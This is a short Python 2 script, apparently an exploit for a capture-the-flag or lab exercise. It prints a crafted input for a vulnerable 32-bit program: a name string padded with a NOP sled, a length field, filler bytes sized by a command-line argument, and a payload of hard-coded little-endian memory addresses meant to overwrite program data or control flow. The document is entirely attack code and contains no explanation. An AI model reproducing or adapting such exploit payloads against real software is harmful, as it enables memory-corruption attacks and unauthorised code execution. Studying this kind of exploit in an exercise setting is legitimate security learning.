#!/usr/bin/python
import sys

name = "Jamie Floyd\x00"+ "\x90" * 56
i = "\x44\x00\x00\x00"
buff = "B"*int(sys.argv[1])
payload = "\xda\x8e\04\x08\x80\xa0\x04\x08\x01"
print name+i+buff+payload
